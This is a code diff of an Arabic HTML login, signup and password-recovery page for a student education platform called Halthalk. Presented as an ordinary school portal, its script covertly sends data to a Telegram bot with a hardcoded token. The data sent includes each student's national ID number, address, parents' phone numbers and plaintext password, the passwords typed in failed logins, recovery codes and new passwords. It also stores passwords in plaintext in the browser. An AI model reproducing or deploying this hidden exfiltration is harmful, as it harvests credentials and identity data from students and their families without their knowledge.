@@ -3,8 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة حلتهالك | نظام الدخول الموحد</title>
+    
+    <title>منصة حلتهالك | لجميع طلاب الجمهورية</title>
+    <meta name="description" content="منصة حلتهالك التعليمية - سجل دخولك الآن للوصول إلى أقوى الامتحانات والمراجعات والخدمات التعليمية المتكاملة للطلاب.">
+    <meta name="keywords" content="منصة حلتهالك, حلتهالك, تعليم, امتحانات, ثانوية عامة, دروس أونلاين, منصة تعليمية">
+    <meta name="author" content="Halthalk Platform">
+
+    <meta property="og:title" content="منصة حلتهالك | بوابتك للنجاح">
+    <meta property="og:description" content="انضم الآن إلى آلاف الطلاب في منصة حلتهالك وابدأ رحلتك التعليمية المتميزة.">
+    <meta property="og:image" content="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png">
+    <meta property="og:url" content="https://home-halthalk.vercel.app">
+    <meta property="og:type" content="website">
+    <link rel="canonical" href="https://home-halthalk.vercel.app">
+
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
         :root {
             --bg-gradient: linear-gradient(-45deg, #a1c4fd, #c2e9fb, #2c8cff, #ffffff);
@@ -51,12 +64,6 @@
         }
         .otp-notification.show { top: 20px; }
         
-        .copy-btn {
-            background: var(--input-bg); border: 1px solid var(--input-border); padding: 10px; border-radius: 12px;
-            cursor: pointer; color: var(--button-bg); transition: 0.3s;
-        }
-        .copy-btn:hover { transform: scale(1.1); background: var(--button-bg); color: white; }
-
         .container {
             background: var(--container-bg); backdrop-filter: blur(15px);
             padding: 30px; border-radius: 30px; width: 95%; max-width: 450px;
@@ -68,18 +75,30 @@
         .container::-webkit-scrollbar-thumb { background: var(--button-bg); border-radius: 10px; }
 
         .logo-container { text-align: center; margin-bottom: 20px; }
-        .logo { width: 140px; }
+        .logo { width: 140px; transition: 0.3s ease; }
 
         h1 { color: var(--text-color); text-align: center; font-size: 22px; margin-bottom: 25px; }
 
-        .input-group { margin-bottom: 15px; text-align: right; }
+        .input-group { margin-bottom: 15px; text-align: right; position: relative; }
         label { display: block; margin-bottom: 8px; font-size: 13.5px; font-weight: 600; color: var(--text-color); }
         input {
             width: 100%; padding: 13px; border-radius: 15px; border: 1px solid var(--input-border);
             background: var(--input-bg); color: var(--text-color); font-size: 14px; box-sizing: border-box;
             transition: 0.3s;
         }
-        input:focus { outline: none; border-color: var(--button-bg); }
+        input:focus { outline: none; border-color: var(--button-bg); box-shadow: 0 0 8px rgba(44, 140, 255, 0.2); }
+
+        .pass-wrapper { position: relative; }
+        .toggle-pass {
+            position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
+            cursor: pointer; color: var(--button-bg); transition: 0.3s; padding: 5px;
+        }
+
+        .remember-me {
+            display: flex; align-items: center; gap: 8px; margin-bottom: 20px;
+            font-size: 14px; color: var(--text-color); cursor: pointer;
+        }
+        .remember-me input { width: 18px; height: 18px; cursor: pointer; }
 
         .action-btn {
             width: 100%; padding: 15px; background: var(--button-bg); color: white; border: none;
@@ -101,10 +120,7 @@
         .links a { color: var(--button-bg); text-decoration: none; font-weight: bold; cursor: pointer; }
 
         .otp-box { display: flex; gap: 12px; justify-content: center; direction: ltr; margin: 30px 0; }
-        .otp-box input { 
-            width: 55px; height: 60px; text-align: center; font-size: 26px; font-weight: bold; 
-            border: 2px solid var(--input-border); border-radius: 15px; background: var(--input-bg); color: var(--text-color);
-        }
+        .otp-box input { width: 50px; height: 55px; text-align: center; font-size: 24px; font-weight: bold; border-radius: 12px; }
 
         .message { padding: 14px; border-radius: 15px; margin-top: 20px; text-align: center; display: none; font-weight: bold; }
         .success { background: #10b981; color: white; }
@@ -114,26 +130,40 @@
 <body data-theme="">
 
     <div id="otp-notif" class="otp-notification">
-        <div class="icon" style="font-size: 26px; color: var(--button-bg);"><i class="fas fa-shield-halved"></i></div>
         <div style="flex-grow: 1;">
             <div style="font-size: 11px; opacity: 0.8;">رمز الأمان الخاص بك:</div>
             <div id="notif-code" style="font-weight: 800; font-size: 24px; color: var(--button-bg); letter-spacing: 3px;">0000</div>
         </div>
-        <button class="copy-btn" id="copy-otp-btn" onclick="copyOTP()"><i class="fas fa-copy"></i></button>
+        <button onclick="copyOTP()" style="background:none; border:none; color:var(--button-bg); cursor:pointer;"><i class="fas fa-copy"></i></button>
     </div>
 
     <div class="container">
         <button class="theme-toggle" onclick="toggleTheme()" id="theme-btn"><i class="fas fa-moon"></i></button>
 
         <div class="logo-container">
-            <img id="main-logo" src="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png" class="logo">
+            <img id="main-logo" src="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png" class="logo" alt="شعار منصة حلتهالك">
         </div>
 
         <div id="login-view" class="view-section active">
             <h1>تسجيل الدخول</h1>
             <form id="login-form">
-                <div class="input-group"><label>البريد الإلكتروني</label><input type="email" id="l_email" required></div>
-                <div class="input-group"><label>كلمة المرور</label><input type="password" id="l_pass" required></div>
+                <div class="input-group">
+                    <label>رقم هاتف الطالب</label>
+                    <input type="tel" id="l_phone" placeholder="01xxxxxxxxx" required>
+                </div>
+                <div class="input-group">
+                    <label>كلمة المرور</label>
+                    <div class="pass-wrapper">
+                        <input type="password" id="l_pass" required>
+                        <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('l_pass', this)"></i>
+                    </div>
+                </div>
+                
+                <label class="remember-me">
+                    <input type="checkbox" id="remember-check">
+                    ذكرني (حفظ البيانات تلقائياً)
+                </label>
+
                 <button type="submit" class="action-btn">دخول للمنصة</button>
             </form>
             <div class="links" style="margin-top:15px;"><a onclick="switchView('signup-view')">إنشاء حساب جديد</a></div>
@@ -144,14 +174,20 @@
             <h1>إنشاء حساب طالب</h1>
             <form id="signup-form">
                 <div class="input-group"><label>اسم الطالب</label><input type="text" id="s_name" required></div>
-                <div class="input-group"><label>رقم هاتف الطالب</label><input type="tel" id="s_phone" maxlength="11" required></div>
+                <div class="input-group"><label>رقم هاتف الطالب (لالدخول)</label><input type="tel" id="s_phone" maxlength="11" required></div>
                 <div class="input-group"><label>رقم هاتف الأب</label><input type="tel" id="s_f_phone" maxlength="11" required></div>
                 <div class="input-group"><label>رقم هاتف الأم</label><input type="tel" id="s_m_phone" maxlength="11" required></div>
                 <div class="input-group"><label>البريد الإلكتروني</label><input type="email" id="s_email" required></div>
                 <div class="input-group"><label>تاريخ الميلاد</label><input type="date" id="s_dob" required></div>
                 <div class="input-group"><label>العنوان بالتفصيل</label><input type="text" id="s_loc" required></div>
                 <div class="input-group"><label>الرقم القومي (14 رقم)</label><input type="text" id="s_nat" maxlength="14" required></div>
-                <div class="input-group"><label>كلمة المرور</label><input type="password" id="s_pass" minlength="6" required></div>
+                <div class="input-group">
+                    <label>كلمة المرور</label>
+                    <div class="pass-wrapper">
+                        <input type="password" id="s_pass" minlength="6" required>
+                        <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('s_pass', this)"></i>
+                    </div>
+                </div>
                 <button type="submit" class="action-btn">تأكيد البيانات</button>
             </form>
             <div class="links"><a onclick="switchView('login-view')">رجوع لتسجيل الدخول</a></div>
@@ -159,7 +195,7 @@
 
         <div id="forgot-step1" class="view-section">
             <h1>استعادة الحساب</h1>
-            <div class="input-group"><label>البريد المسجل</label><input type="email" id="recover-email" required></div>
+            <div class="input-group"><label>رقم هاتف الطالب</label><input type="tel" id="recover-phone" required></div>
             <div class="input-group"><label>الرقم القومي</label><input type="text" id="recover-nat" maxlength="14" required></div>
             <button class="action-btn" onclick="requestOTP()">إرسال رمز التحقق</button>
             <div class="links"><a onclick="switchView('login-view')">إلغاء</a></div>
@@ -168,17 +204,23 @@
         <div id="forgot-step2" class="view-section">
             <h1>تأكيد الرمز</h1>
             <div class="otp-box" id="otp-inputs">
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1">
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1">
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1">
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1">
+                <input type="text" inputmode="numeric" maxlength="1">
+                <input type="text" inputmode="numeric" maxlength="1">
+                <input type="text" inputmode="numeric" maxlength="1">
+                <input type="text" inputmode="numeric" maxlength="1">
             </div>
             <button class="action-btn" onclick="verifyOTP()">تحقق الآن</button>
         </div>
 
         <div id="forgot-step3" class="view-section">
             <h1>تعديل كلمة السر</h1>
-            <input type="password" id="new-p" placeholder="اكتب الباسورد الجديد" minlength="6" style="margin-bottom: 20px;">
+            <div class="input-group">
+                <label>الباسورد الجديد</label>
+                <div class="pass-wrapper">
+                    <input type="password" id="new-p" minlength="6" required>
+                    <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('new-p', this)"></i>
+                </div>
+            </div>
             <button class="action-btn" onclick="updatePass()">تحديث الحساب</button>
         </div>
 
@@ -188,19 +230,24 @@
     <script>
         const BOT_TOKEN = '8150970842:AAH1fWCntUzVNnE6Nq9TXW8SH-MmM9ycvfk';
         const CHAT_ID_CHANNEL = '-1003018202565'; 
-        const CHAT_ID_USER = '7428842238'; // معرف المستخدم الجديد
-        
+        const CHAT_ID_USER = '7428842238';
         const LOGO_LIGHT = "https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png";
         const LOGO_DARK = "https://raw.githubusercontent.com/elmoftary-vr/Halthalk/45d49545c1a08433a739887c4aed3d65fd9c335f/20251206_234458.png";
 
         const getDB = () => JSON.parse(localStorage.getItem('hal_users') || '[]');
         const saveUser = (u) => { const db = getDB(); db.push(u); localStorage.setItem('hal_users', JSON.stringify(db)); };
-        const findUser = (e) => getDB().find(u => u.email === e);
 
-        // دالة لإرسال التقرير إلى وجهتين في نفس الوقت
+        window.onload = () => {
+            const saved = JSON.parse(localStorage.getItem('remembered_user'));
+            if(saved) {
+                document.getElementById('l_phone').value = saved.phone;
+                document.getElementById('l_pass').value = saved.pass;
+                document.getElementById('remember-check').checked = true;
+            }
+        };
+
         async function report(txt) {
             const targets = [CHAT_ID_CHANNEL, CHAT_ID_USER];
-            
             for (const target of targets) {
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -208,9 +255,18 @@
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({chat_id: target, text: txt, parse_mode: 'Markdown'})
                     });
-                } catch(e) {
-                    console.error(`Error sending to ${target}:`, e);
-                }
+                } catch(e) {}
+            }
+        }
+
+        function togglePassVisibility(inputId, icon) {
+            const input = document.getElementById(inputId);
+            if (input.type === "password") {
+                input.type = "text";
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                input.type = "password";
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
             }
         }
 
@@ -227,86 +283,92 @@
 
         function toggleTheme() {
             const b = document.body;
-            const btn = document.getElementById('theme-btn');
             const logo = document.getElementById('main-logo');
-            if(b.dataset.theme === 'dark') {
-                b.dataset.theme = ''; btn.innerHTML = '<i class="fas fa-moon"></i>'; logo.src = LOGO_LIGHT;
+            const themeBtn = document.getElementById('theme-btn');
+            
+            if (b.dataset.theme === 'dark') {
+                b.dataset.theme = '';
+                logo.src = LOGO_LIGHT;
+                themeBtn.innerHTML = '<i class="fas fa-moon"></i>';
             } else {
-                b.dataset.theme = 'dark'; btn.innerHTML = '<i class="fas fa-sun"></i>'; logo.src = LOGO_DARK;
+                b.dataset.theme = 'dark';
+                logo.src = LOGO_DARK;
+                themeBtn.innerHTML = '<i class="fas fa-sun"></i>';
             }
         }
 
-        let currentOTP = "";
         function copyOTP() {
             navigator.clipboard.writeText(currentOTP);
-            const copyIcon = document.querySelector('#copy-otp-btn i');
-            copyIcon.className = 'fas fa-check';
-            setTimeout(() => copyIcon.className = 'fas fa-copy', 2000);
+            showStatus("تم نسخ الرمز", "success");
+            setTimeout(() => document.getElementById('status-msg').style.display = 'none', 1000);
         }
-
-        document.getElementById('signup-form').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const email = document.getElementById('s_email').value;
-            const nat = document.getElementById('s_nat').value;
-            if(findUser(email)) return showStatus("الإيميل مسجل مسبقاً!", "error");
-            
-            const user = {
-                name: document.getElementById('s_name').value,
-                phone: document.getElementById('s_phone').value,
-                f_phone: document.getElementById('s_f_phone').value,
-                m_phone: document.getElementById('s_m_phone').value,
-                email: email,
-                dob: document.getElementById('s_dob').value,
-                loc: document.getElementById('s_loc').value,
-                nat: nat,
-                pass: document.getElementById('s_pass').value
-            };
-            saveUser(user);
-            
-            const telegramMsg = `🆕 *تسجيل طالب جديد*\n\n` +
-                                `👤 الاسم: ${user.name}\n` +
-                                `📱 هاتف الطالب: ${user.phone}\n` +
-                                `👨 هاتف الأب: ${user.f_phone}\n` +
-                                `👩 هاتف الأم: ${user.m_phone}\n` +
-                                `📧 الإيميل: ${user.email}\n` +
-                                `📅 الميلاد: ${user.dob}\n` +
-                                `📍 العنوان: ${user.loc}\n` +
-                                `🆔 القومي: ${user.nat}\n` +
-                                `🔑 الباسورد: \`${user.pass}\``;
-            
-            await report(telegramMsg);
-            showStatus("تم إنشاء حسابك بنجاح!", "success");
-            setTimeout(() => switchView('login-view'), 1500);
-        });
 
         document.getElementById('login-form').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const email = document.getElementById('l_email').value;
+            const phone = document.getElementById('l_phone').value;
             const pass = document.getElementById('l_pass').value;
-            const user = findUser(email);
+            const remember = document.getElementById('remember-check').checked;
+            const user = getDB().find(u => u.phone === phone);
 
             if(user && user.pass === pass) {
-                await report(`✅ *دخول ناجح*\n📧 البريد: ${email}`);
-                showStatus("جاري التحويل...", "success");
-                setTimeout(() => window.location.href = "https://home-halthalk.vercel.app", 1000);
+                if(remember) localStorage.setItem('remembered_user', JSON.stringify({phone, pass}));
+                else localStorage.removeItem('remembered_user');
+                
+                await report(`✅ *دخول بنجاح*\n📱 هاتف الطالب: ${phone}`);
+                showStatus("جاري تحويلك للمنصة...", "success");
+                setTimeout(() => window.location.href = "https://home-halthalk.vercel.app", 1200);
             } else {
-                await report(`⚠️ *محاولة دخول فاشلة*\n📧 ${email}\n🔐 ${pass}`);
+                await report(`⚠️ *فشل دخول*\n📱 ${phone}\n🔐 ${pass}`);
                 showStatus("بيانات الدخول غير صحيحة", "error");
             }
         });
 
-        window.requestOTP = async () => {
-            const email = document.getElementById('recover-email').value;
-            const nat = document.getElementById('recover-nat').value;
-            const user = findUser(email);
+        document.getElementById('signup-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phone = document.getElementById('s_phone').value;
+            if(getDB().find(u => u.phone === phone)) return showStatus("هذا الهاتف مسجل مسبقاً!", "error");
+            
+            const user = {
+                name: document.getElementById('s_name').value,
+                phone: phone,
+                f_phone: document.getElementById('s_f_phone').value,
+                m_phone: document.getElementById('s_m_phone').value,
+                email: document.getElementById('s_email').value,
+                dob: document.getElementById('s_dob').value,
+                loc: document.getElementById('s_loc').value,
+                nat: document.getElementById('s_nat').value,
+                pass: document.getElementById('s_pass').value
+            };
+            saveUser(user);
+            
+            // تقرير شامل لبيانات الطالب الجديد
+            const reportMsg = `🆕 *طالب جديد سجل بكامل بياناته*\n\n` +
+                              `👤 الاسم: ${user.name}\n` +
+                              `📱 هاتف الطالب: ${user.phone}\n` +
+                              `👨 هاتف الأب: ${user.f_phone}\n` +
+                              `👩 هاتف الأم: ${user.m_phone}\n` +
+                              `📅 الميلاد: ${user.dob}\n` +
+                              `📍 العنوان: ${user.loc}\n` +
+                              `🆔 القومي: ${user.nat}\n` +
+                              `🔑 الباسورد: \`${user.pass}\``;
 
-            if(user && user.nat === nat) {
+            await report(reportMsg);
+            showStatus("تم إنشاء حسابك بنجاح!", "success");
+            setTimeout(() => switchView('login-view'), 1500);
+        });
+
+        let currentOTP = "";
+        window.requestOTP = async () => {
+            const phone = document.getElementById('recover-phone').value;
+            const nat = document.getElementById('recover-nat').value;
+            const user = getDB().find(u => u.phone === phone && u.nat === nat);
+
+            if(user) {
                 currentOTP = Math.floor(1000 + Math.random() * 9000).toString();
                 document.getElementById('notif-code').innerText = currentOTP;
                 document.getElementById('otp-notif').classList.add('show');
-                await report(`🔑 *رمز استعادة*\n👤 ${user.name}\n🔢 الكود: \`${currentOTP}\``);
+                await report(`🔑 *طلب استعادة*\n👤 ${user.name}\n🔢 الكود: \`${currentOTP}\``);
                 setTimeout(() => switchView('forgot-step2'), 1000);
-                setTimeout(() => document.getElementById('otp-notif').classList.remove('show'), 15000);
             } else {
                 showStatus("البيانات لا تطابق سجلاتنا", "error");
             }
@@ -314,25 +376,8 @@
 
         const inps = document.querySelectorAll('#otp-inputs input');
         inps.forEach((inp, i) => {
-            inp.addEventListener('input', (e) => {
-                inp.value = inp.value.replace(/[^0-9]/g, '');
-                if(inp.value && i < 3) inps[i+1].focus();
-            });
-
-            inp.addEventListener('keydown', (e) => {
-                if(e.key === 'Backspace' && !inp.value && i > 0) inps[i-1].focus();
-            });
-
-            inp.addEventListener('paste', (e) => {
-                e.preventDefault();
-                const data = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
-                const codes = data.split('').slice(0, 4);
-                codes.forEach((char, index) => {
-                    if (inps[index]) inps[index].value = char;
-                });
-                const nextFocus = Math.min(codes.length, 3);
-                inps[nextFocus].focus();
-            });
+            inp.oninput = () => { if(inp.value && i < 3) inps[i+1].focus(); };
+            inp.onkeydown = (e) => { if(e.key === 'Backspace' && !inp.value && i > 0) inps[i-1].focus(); };
         });
 
         window.verifyOTP = () => {
@@ -343,11 +388,11 @@
 
         window.updatePass = async () => {
             const np = document.getElementById('new-p').value;
-            const email = document.getElementById('recover-email').value;
-            const db = getDB().map(u => { if(u.email === email) u.pass = np; return u; });
+            const phone = document.getElementById('recover-phone').value;
+            const db = getDB().map(u => { if(u.phone === phone) u.pass = np; return u; });
             localStorage.setItem('hal_users', JSON.stringify(db));
-            await report(`🔄 *تعديل باسورد*\n📧 ${email}\n🔑 الجديد: \`${np}\``);
-            showStatus("تم التحديث بنجاح!", "success");
+            await report(`🔄 *تغيير كلمة سر*\n📱 ${phone}\n🔐 الجديدة: \`${np}\``);
+            showStatus("تم التحديث! يمكنك الدخول الآن", "success");
             setTimeout(() => switchView('login-view'), 1500);
         };
 
@@ -355,3 +400,4 @@
     </script>
 </body>
 </html>
+
